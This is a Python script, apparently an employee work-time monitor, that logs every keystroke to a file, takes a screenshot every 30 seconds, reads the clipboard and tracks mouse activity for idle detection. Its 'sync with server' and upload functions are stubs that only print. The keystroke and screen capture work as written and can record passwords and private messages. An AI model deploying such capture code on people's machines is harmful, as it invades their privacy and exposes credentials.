from pynput.keyboard import Listener as kb
import logging
import os
import pyperclip
from pynput.mouse import Listener as ms
import threading
import time
from datetime import datetime
import pyautogui
import glob
last_activity_time = 0
last_activity = datetime.now()
idle_check_time = 60#S
sceen_shot_dealy = 30#S
clear_keys_delay = 30#S

#------------------------- SCREEN SHOT START-------------------------------#
def screen_shot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'data/SCREEN_SHOT/screen_shot_'+str(datetime.now())+'.png')
    time.sleep(sceen_shot_dealy)
    screen_shot()
#------------------------- SCREEN SHOT END --------------------------------#


#--------------------------WORKING TIME -----------------------------------#
def update_last_time():
    global last_activity
    last_activity = datetime.now()
    #print(last_activity)
def working_time():
    duration = datetime.now() - last_activity
    duration_in_s = duration.total_seconds() 
    if(duration_in_s > idle_check_time):
        print("Not Working (waste time is "+str(duration_in_s)+" Second)")
    else:
        print("Working")
    time.sleep(idle_check_time)
    working_time()
#---------------------------WORKING TIME END

#---------------------------POWER ON START--------------------------------#

def power_on():
    power_on=str(datetime.now())
    print(power_on)
#---------------------------POWER ON END ----------------------------------#

#----------------------------SYNC WITH SERVER------------------------------#

def sysnc_with_server(data_content,content_type):
    print("Syncing with server")
def upload_file():
    shots=glob.glob("data/SCREEN_SHOT/*.png")
    print(shots)


#----------------------------SYNC WITH SERVER END--------------------------#



#-----------------------------BASIC INFOS ---------------------------------#
def directory():
    return os.getcwd()
#-----------------------------BASIC INFOS END------------------------------#

#------------------------KEY LOGGER START ---------------------------------#
def clear_keys():
    b = os.path.getsize(str(directory())+"/data/key_log.txt")
    if(int(b) > 1000):
        f = open('data/key_log.txt','r')
        key_logger_data=f.read()
        print(key_logger_data)
        file = open("data/key_log.txt","w")
        file.close()
        sysnc_with_server('A','B')
    time.sleep(clear_keys_delay)
    clear_keys()
def key_logger():
    logging.basicConfig(filename="data/key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(format(key))
        update_last_time()
    with kb(on_press=on_press) as listener:  
        listener.join()
#--------------------KEY LOGGER END ---------------------------------------#

#--------------------MOUSE LOGGER START -----------------------------------#
def mouse_logger():
    def on_move(x, y):
        update_last_time()
    def on_click(x, y, button, pressed):
        update_last_time()
    def on_scroll(x, y, dx, dy):
        update_last_time()
    with ms(on_move=on_move,on_click=on_click,on_scroll=on_scroll) as listenerMouse:
        listenerMouse.join()
#--------------------MOUSE LOGGER END -------------------------------------#

#-------------------CLIP BOARD START --------------------------------------#
def clip_boardd():
    s = pyperclip.paste()
    print(s)

#-------------------CLIP BOARD END ----------------------------------------#
t1 = threading.Thread(target=key_logger)
t2 = threading.Thread(target=mouse_logger)
t3 = threading.Thread(target=working_time)
t4 = threading.Thread(target=clear_keys)
t5 = threading.Thread(target=screen_shot)
t6 = threading.Thread(target=upload_file)
power_on()
clip_boardd()
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
